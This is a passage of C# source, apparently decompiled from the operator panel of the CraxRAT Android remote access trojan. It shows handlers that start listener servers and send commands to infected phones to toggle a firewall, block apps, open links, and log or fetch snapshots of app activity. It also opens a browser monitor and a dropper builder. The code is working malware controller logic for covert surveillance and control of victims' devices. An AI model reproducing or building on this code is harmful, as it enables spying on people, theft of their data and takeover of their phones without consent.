	private void Bigtitletext_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void Label2_MouseDown_1(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			Codes.ReleaseCapture();
			Codes.SendMessage(base.Handle, 161, 2, 0);
		}
	}

	

	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		try
		{
			notificationspanel.BringToFront();
			DataLog.Visible = true;
			clearbtn.Visible = true;
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
			{
				if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
					bigtitletext.Text = "Notificatios";
				else
					bigtitletext.Text = "通知";
			}
			else
				bigtitletext.Text = "التنبيهات";
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void DrakeUIButtonIcon10_Click_2(object sender, EventArgs e)
	{
		if (DGVNOTF.Rows.Count > 0)
			DGVNOTF.Rows.Clear();
	}

	private void DrakeUIButtonIcon7_Click_2(object sender, EventArgs e)
	{
		if (DGVCALLS.Rows.Count > 0)
			DGVCALLS.Rows.Clear();
	}

	private void DrakeUIButtonIcon11_Click_1(object sender, EventArgs e)
	{
		if (DGVALRTS.Rows.Count > 0)
			DGVALRTS.Rows.Clear();
	}

	private void Porttext_TextChanged(object sender, EventArgs e)
	{
		if (!(string.IsNullOrEmpty(porttext.Text) | string.IsNullOrWhiteSpace("porttext.Text")) && !Versioned.IsNumeric(porttext.Text))
		{
			CraxsAlert.Showinformation("Only Enter Numbers");
			porttext.Text = "";
		}
	}


	private void Rempo_Click(object sender, EventArgs e)
	{
        if (DGVSERVS.Rows.Count < 1)
            return;
        if (DGVSERVS.SelectedRows.Count == 0)
        {
            CraxsAlert.Showinformation("Select Port First");
            return;
        }
        DataGridViewRow dataGridViewRow = DGVSERVS.SelectedRows[0];
        if (dataGridViewRow != null)
        {
            if (Operators.ConditionalCompareObjectEqual(dataGridViewRow.Cells[2].Value, "ON", TextCompare: false))
                CraxsAlert.Showinformation("Stop Server First");
            else
                DGVSERVS.Rows.Remove(dataGridViewRow);
        }
    }

	private void DrakeUIButtonIcon15_Click(object sender, EventArgs e)
	{
		if (DGVSERVS.Rows.Count >= 1 && DGVSERVS.SelectedRows.Count == 0)
			CraxsAlert.Showinformation("Select Port First");
	}

	private void DrakeUIButtonIcon14_Click(object sender, EventArgs e)
	{
		try
		{
            connectionpanel.BringToFront();
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
			{
				if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
					bigtitletext.Text = "Servers";
				else
					bigtitletext.Text = "服务器";
			}
			else
				bigtitletext.Text = "المخدمات";
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void Exitbtn_Click(object sender, EventArgs e)
	{
		if (DGVSERVS.Rows.Count >= 1 && DGVSERVS.SelectedRows.Count == 0)
			CraxsAlert.Showinformation("Select Port First");
	}

	
	private void DrakeUIAvatar8_Click_1(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count <= 0 || ClientsWindow.SelectedRows.Count <= 0)
			return;
		Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
		if (client.IsonVPN)
		{
			Codes.MyMsgBox("Alert", "Firewall is already active", useno: false, Resources.warning48px);
			return;
		}
		string[] array = client.Keys.Split(':');
		int num = 0;
		int num2 = 0;
		if (Codes.MyMsgBox("Alert", "Client will restart connection", useno: true, Resources.warning48px))
		{
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "FW<*>S" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
			Thread.Sleep(1000);
			client.Close(client.myClient);
		}
	}

	private void DrakeUIAvatar9_Click_1(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count <= 0 || ClientsWindow.SelectedRows.Count <= 0)
			return;
		Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
		if (!client.IsonVPN)
		{
			Codes.MyMsgBox("Alert", "Firewall is already disabled", useno: false, Resources.warning48px);
			return;
		}
		string[] array = client.Keys.Split(':');
		int num = 0;
		int num2 = 0;
		if (Codes.MyMsgBox("Alert", "Client will restart connection", useno: true, Resources.warning48px))
		{
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "FW<*>T" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
			Thread.Sleep(1000);
			client.Close(client.myClient);
		}
	}

	private void DrakeUIAvatar5_Click_1(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count > 0 && ClientsWindow.SelectedRows.Count > 0)
		{
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "FW<*>C" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void AllowAppToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count <= 0 || ClientsWindow.SelectedRows.Count <= 0)
			return;
		Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
		if (DGFW.Rows.Count != 0)
		{
			if (DGFW.SelectedRows.Count == 0)
			{
				CraxsAlert.Showinformation("Select app first");
				return;
			}
			if (Operators.CompareString(DGFW.SelectedRows[0].Cells[2].Value.ToString(), "Allowed", TextCompare: false) == 0)
			{
				CraxsAlert.Showinformation("Select app is not Blocked.");
				return;
			}
			string text = DGFW.SelectedRows[0].Cells[3].Value.ToString();
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "FW<*>A>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void ToolStripMenuItem15_Click_1(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count <= 0 || ClientsWindow.SelectedRows.Count <= 0)
			return;
		Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
		if (DGFW.Rows.Count != 0)
		{
			if (DGFW.SelectedRows.Count == 0)
			{
				CraxsAlert.Showinformation("Select app first");
				return;
			}
			if (Operators.CompareString(DGFW.SelectedRows[0].Cells[2].Value.ToString(), "Allowed", TextCompare: false) != 0)
			{
				CraxsAlert.Showinformation("Select app is already Blocked.");
				return;
			}
			string text = DGFW.SelectedRows[0].Cells[3].Value.ToString();
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "FW<*>B>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void DrakeUIAvatar10_Click(object sender, EventArgs e)
	{
	}

	private void DrakeUIButtonIcon17_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Web_Browser_" + client.ClientAddressIP;
						WebViewMonitor webViewMonitor = (WebViewMonitor)MyProject.Application.OpenForms[name];
						if (webViewMonitor == null)
						{
							webViewMonitor = new WebViewMonitor();
							webViewMonitor.Name = name;
							webViewMonitor.Title = string.Format("{0} - IP:{1}", "Web Browser", client.ClientAddressIP);
							webViewMonitor.Tag = client.ClientAddressIP;
							webViewMonitor.Classclient = client;
							webViewMonitor.Show();
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	
	private void DrakeUIButtonIcon19_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						TcpClient myClient = client.myClient;
						Dialog1 dialog = new Dialog1();
						dialog.Title = "Enter Link";
						dialog.ShowDialog();
						if (dialog.DialogResult != DialogResult.OK)
							break;
						string[] array = client.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lnk<*>" + reso.ChekLink(dialog.Mytext.Text) + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void DrakeUIButtonIcon16_Click(object sender, EventArgs e)
	{
		TRKPANEL.BringToFront();
	}

	private void DrakeUIButtonIcon14_Click_1(object sender, EventArgs e)
	{
		FWPANEL.BringToFront();
	}

	private void DrakeUIAvatar11_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count > 0 && ClientsWindow.SelectedRows.Count > 0)
		{
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>L" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void ToolStripMenuItem20_Click(object sender, EventArgs e)
	{
		if (DGVTRK.Rows.Count > 0 && DGVTRK.SelectedRows.Count > 0)
		{
			string text = DGVTRK.SelectedRows[0].Cells[3].Value.ToString();
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>S>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void DrakeUIButtonIcon20_Click(object sender, EventArgs e)
	{
		recordsShowpanel.SendToBack();
		recordshowtext.Text = "";
	}

	private void ToolStripMenuItem21_Click(object sender, EventArgs e)
	{
		if (DGVTRK.Rows.Count > 0 && DGVTRK.SelectedRows.Count > 0)
		{
			if (Operators.CompareString(DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", TextCompare: false) == 0)
			{
				Codes.MyMsgBox("Alert", "this app is not installed on this phone.", useno: false, Resources.error48px);
				return;
			}
			if (Operators.CompareString(DGVTRK.SelectedRows[0].Cells[2].Value.ToString(), "Yes", TextCompare: false) != 0)
			{
				Codes.MyMsgBox("Alert", "There are no logs for this app yet.", useno: false, Resources.error48px);
				return;
			}
			string text = DGVTRK.SelectedRows[0].Cells[4].Value.ToString();
			recordshowtext.Text = text;
			recordsShowpanel.BringToFront();
		}
	}

	private void ToolStripMenuItem23_Click(object sender, EventArgs e)
	{
		if (DGVTRK.Rows.Count > 0 && DGVTRK.SelectedRows.Count > 0)
		{
			if (Operators.CompareString(DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", TextCompare: false) == 0)
			{
				Codes.MyMsgBox("Alert", "this app is not installed on this phone.", useno: false, Resources.error48px);
				return;
			}
			string text = DGVTRK.SelectedRows[0].Cells[1].Value.ToString();
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>R>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void ToolStripMenuItem19_Click(object sender, EventArgs e)
	{
		if (DGVTRK.Rows.Count > 0 && DGVTRK.SelectedRows.Count > 0)
		{
			if (Operators.CompareString(DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", TextCompare: false) == 0)
			{
				Codes.MyMsgBox("Alert", "this app is not installed on this phone.", useno: false, Resources.error48px);
				return;
			}
			if ((combodatestrack.Items == null) | string.IsNullOrEmpty(combodatestrack.Text))
			{
				Codes.MyMsgBox("Alert", "Select Snaps Date.", useno: false, Resources.error48px);
				return;
			}
			string text = DGVTRK.SelectedRows[0].Cells[1].Value.ToString();
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>G>" + text + ">" + client.ClientRemoteAddress + ">" + combodatestrack.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void ToolStripMenuItem24_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count <= 0 || ClientsWindow.SelectedRows.Count <= 0)
			return;
		Dialog1 dialog = new Dialog1();
		dialog.Title = "Enter App ID";
		dialog.ShowDialog();
		if (dialog.DialogResult == DialogResult.OK)
		{
			string text = dialog.Mytext.Text;
			if (Codes.IsValidPackageName(text) || Codes.MyMsgBox("Alert", "this new ID is not valid as app id\r\nare you sure you want to continue ?", useno: true, Resources.error48px))
			{
				Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
				string[] array = client.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					client.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>A>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(parametersObjects);
			}
		}
	}

	private void ToolStripMenuItem22_Click(object sender, EventArgs e)
	{
		if (DGVTRK.Rows.Count > 0 && DGVTRK.SelectedRows.Count > 0)
		{
			if (Operators.CompareString(DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", TextCompare: false) == 0)
			{
				Codes.MyMsgBox("Alert", "this app is not installed on this phone.", useno: false, Resources.error48px);
				return;
			}
			if ((combodatestrack.Items == null) | string.IsNullOrEmpty(combodatestrack.Text))
			{
				Codes.MyMsgBox("Alert", "Select Snaps Date.", useno: false, Resources.error48px);
				return;
			}
			string text = DGVTRK.SelectedRows[0].Cells[1].Value.ToString();
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>D>" + text + ">" + combodatestrack.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void ToolStripMenuItem25_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count <= 0 || ClientsWindow.SelectedRows.Count <= 0)
			return;
		Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
		if (DGFW.Rows.Count != 0)
		{
			if (DGFW.SelectedRows.Count == 0)
			{
				CraxsAlert.Showinformation("Select app first");
				return;
			}
			string text = DGFW.SelectedRows[0].Cells[3].Value.ToString();
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>A>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void DGVSERVS_CellClick(object sender, DataGridViewCellEventArgs e)
	{
        if (e.ColumnIndex != 0 || e.RowIndex < 0)
            return;
        string left = DGVSERVS.Rows[e.RowIndex].Cells[e.ColumnIndex].Tag.ToString();
        DGVSERVS.ClearSelection();
        DGVSERVS.CurrentCell = DGVSERVS.Rows[e.RowIndex].Cells[0];
        DGVSERVS.Rows[e.RowIndex].Selected = true;
        if (Operators.CompareString(left, "OFF", TextCompare: false) == 0)
        {
            _Closure_0024__210_002D0 arg = default(_Closure_0024__210_002D0);
            _Closure_0024__210_002D0 CS_0024_003C_003E8__locals0 = new _Closure_0024__210_002D0(arg);
            CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
            string path = Application.StartupPath + "\\res\\Config\\Pass.inf";
            CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber = Conversions.ToString(DGVSERVS.SelectedRows[0].Tag);
            int port = Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber);
            DataGridViewRow dataGridViewRow = DGVSERVS.SelectedRows[0];
            if (dataGridViewRow != null)
            {
                string right = dataGridViewRow.Cells[1].Value.ToString();
                dataGridViewRow = null;
                bool flag = false;
                foreach (Accept item in server)
                {
                    if (Operators.CompareString(item.Myport, right, TextCompare: false) == 0)
                    {
                        flag = true;
                        break;
                    }
                }
                if (flag)
                {
                    CraxsAlert.Showinformation("this port is already active");
                    return;
                }
            }
            if (!Codes.CheckPort(port))
            {
                Codes.MyMsgBox("Port in use", "this port:" + CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber + "  is used by another program.", useno: false, Resources.warning48px);
                return;
            }
            if (!File.Exists(path))
                File.WriteAllText(path, Codes.Encrypt("X0X0X", Data.THEKEY));
            string[] array = File.ReadAllLines(path);
            if (Operators.CompareString(passtxt.Text, Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY), TextCompare: false) != 0)
            {
                if (passtxt.Text.Length > 3)
                {
                    string text = File.ReadAllText(path);
                    text = text.Replace(array.GetValue(0).ToString(), Codes.Encrypt(passtxt.Text, Data.THEKEY));
                    File.WriteAllText(path, text);
                }
                else if (passtxt.Text.Length < 4)
                {
                    Codes.MyMsgBox("Warning", "Password Shoud be more Than 3 chars", useno: false, Resources.warning48px);
                    return;
                }
            }
            try
            {
                array = File.ReadAllLines(path);
                if (array.GetValue(0).ToString().Length < 3)
                {
                    File.WriteAllText(path, Codes.Encrypt("X0X0X", Data.THEKEY));
                    Data.password = Codes.AES_Decrypt(Codes.Encrypt("X0X0X", Data.THEKEY), Data.THEKEY);
                }
                else
                    Data.password = Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY);
                Thread thread = new Thread([SpecialName] () =>
                {
                    CS_0024_003C_003E8__locals0._0024VB_0024Me.server.Add(new Accept(CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber));
                });
                thread.IsBackground = true;
                thread.Start();
                DGVSERVS.SelectedRows[0].Cells[0].Value = Resources.swtchon;
                DGVSERVS.SelectedRows[0].Cells[0].Tag = "ON";
                DGVSERVS.SelectedRows[0].Cells[2].Value = "ON";
                DGVSERVS.SelectedRows[0].Cells[2].Style.ForeColor = System.Drawing.Color.Lime;
                CraxsAlert.ShowSucess("Server Start on " + CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber + " Successfully");
                return;
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
                return;
            }
        }
        DataGridViewRow dataGridViewRow2 = DGVSERVS.SelectedRows[0];
        if (dataGridViewRow2 == null)
            return;
        string text2 = dataGridViewRow2.Cells[1].Value.ToString();
        Accept accept = null;
        foreach (Accept item2 in server)
        {
            if (Operators.CompareString(item2.Myport, text2, TextCompare: false) == 0)
            {
                item2.MainListner.Server.Close();
                item2.MainListner.Server.Dispose();
                item2.MainListner.Stop();
                dataGridViewRow2.Cells[0].Value = Resources.swtchoff;
                dataGridViewRow2.Cells[0].Tag = "OFF";
                dataGridViewRow2.Cells[2].Value = "OFF";
                dataGridViewRow2.Cells[2].Style.ForeColor = System.Drawing.Color.Red;
                PORTs.Replace(text2 + ">", "");
                accept = item2;
                break;
            }
        }
        if (accept != null)
        {
            server.Remove(accept);
            accept = null;
        }
    }




    private void Startserver(DataGridViewCellEventArgs e)
	{


        if (e.ColumnIndex != 0 || e.RowIndex < 0)
            return;
        string left = DGVSERVS.Rows[e.RowIndex].Cells[e.ColumnIndex].Tag.ToString();
        DGVSERVS.ClearSelection();
        DGVSERVS.CurrentCell = DGVSERVS.Rows[e.RowIndex].Cells[0];
        DGVSERVS.Rows[e.RowIndex].Selected = true;
        if (Operators.CompareString(left, "OFF", TextCompare: false) == 0)
        {
            _Closure_0024__210_002D0 arg = default(_Closure_0024__210_002D0);
            _Closure_0024__210_002D0 CS_0024_003C_003E8__locals0 = new _Closure_0024__210_002D0(arg);
            CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
            string path = Application.StartupPath + "\\res\\Config\\Pass.inf";
            CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber = Conversions.ToString(DGVSERVS.SelectedRows[0].Tag);
            int port = Conversions.ToInteger(CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber);
            DataGridViewRow dataGridViewRow = DGVSERVS.SelectedRows[0];
            if (dataGridViewRow != null)
            {
                string right = dataGridViewRow.Cells[1].Value.ToString();
                dataGridViewRow = null;
                bool flag = false;
                foreach (Accept item in server)
                {
                    if (Operators.CompareString(item.Myport, right, TextCompare: false) == 0)
                    {
                        flag = true;
                        break;
                    }
                }
                if (flag)
                {
                    CraxsAlert.Showinformation("this port is already active");
                    return;
                }
            }
            if (!Codes.CheckPort(port))
            {
                Codes.MyMsgBox("Port in use", "this port:" + CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber + "  is used by another program.", useno: false, Resources.warning48px);
                return;
            }
            if (!File.Exists(path))
                File.WriteAllText(path, Codes.Encrypt("X0X0X", Data.THEKEY));
            string[] array = File.ReadAllLines(path);
            if (Operators.CompareString(passtxt.Text, Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY), TextCompare: false) != 0)
            {
                if (passtxt.Text.Length > 3)
                {
                    string text = File.ReadAllText(path);
                    text = text.Replace(array.GetValue(0).ToString(), Codes.Encrypt(passtxt.Text, Data.THEKEY));
                    File.WriteAllText(path, text);
                }
                else if (passtxt.Text.Length < 4)
                {
                    Codes.MyMsgBox("Warning", "Password Shoud be more Than 3 chars", useno: false, Resources.warning48px);
                    return;
                }
            }
            try
            {
                array = File.ReadAllLines(path);
                if (array.GetValue(0).ToString().Length < 3)
                {
                    File.WriteAllText(path, Codes.Encrypt("X0X0X", Data.THEKEY));
                    Data.password = Codes.AES_Decrypt(Codes.Encrypt("X0X0X", Data.THEKEY), Data.THEKEY);
                }
                else
                    Data.password = Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY);
                Thread thread = new Thread([SpecialName] () =>
                {
                    CS_0024_003C_003E8__locals0._0024VB_0024Me.server.Add(new Accept(CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber));
                });
                thread.IsBackground = true;
                thread.Start();



                DGVSERVS.SelectedRows[0].Cells[0].Value = Craxs_Rat_Resources.close48px;
                DGVSERVS.SelectedRows[0].Cells[0].Tag = "ON";
                DGVSERVS.SelectedRows[0].Cells[2].Value = "ON";
                DGVSERVS.SelectedRows[0].Cells[2].Style.ForeColor = System.Drawing.Color.Lime;
                CraxsAlert.ShowSucess("Server Start on " + CS_0024_003C_003E8__locals0._0024VB_0024Local_portnumber + " Successfully");
                return;
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
                return;
            }
        }
        DataGridViewRow dataGridViewRow2 = DGVSERVS.SelectedRows[0];
        if (dataGridViewRow2 == null)
            return;
        string text2 = dataGridViewRow2.Cells[1].Value.ToString();
        Accept accept = null;
        foreach (Accept item2 in server)
        {
            if (Operators.CompareString(item2.Myport, text2, TextCompare: false) == 0)
            {
                item2.MainListner.Server.Close();
                item2.MainListner.Server.Dispose();
                item2.MainListner.Stop();





                dataGridViewRow2.Cells[0].Value = Craxs_Rat_Resources.Abov_mid;
                dataGridViewRow2.Cells[0].Tag = "OFF";
                dataGridViewRow2.Cells[2].Value = "OFF";
                dataGridViewRow2.Cells[2].Style.ForeColor = System.Drawing.Color.Red;
                PORTs.Replace(text2 + ">", "");
                accept = item2;
                break;
            }
        }
        if (accept != null)
        {
            server.Remove(accept);
            accept = null;
        }
    }











	private void Droperbtn_Click(object sender, EventArgs e)
	{
		if (DR == null)
		{
			DR = new Drooper();
			DialogResult dialogResult = DR.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				DR.Close();
				DR = null;
			}
			else
			{
				DR.Close();
				DR = null;
			}
		}
	}

	private void ClientsWindow_CellEndEdit(object sender, DataGridViewCellEventArgs e)
	{
		int num = ClientsWindow.Width;
		int num2 = ClientsWindow.Height;
		int num3 = 0;
		checked
		{
			int num4 = ClientsWindow.Columns.Count - 1;
			for (int i = 0; i <= num4; i++)
			{
				num3 += ClientsWindow.Columns[i].Width;
			}
			num3 += 50;
			ClientsWindow.Size = new Size(num3, num2);
			ClientsWindow.Width = num3;
			int num5 = ClientsWindow.Width;
			int num6 = num5 - num;
			DashboardPanel.Width += num6;
		}
	}

	private void Satustimer_Tick(object sender, EventArgs e)
	{
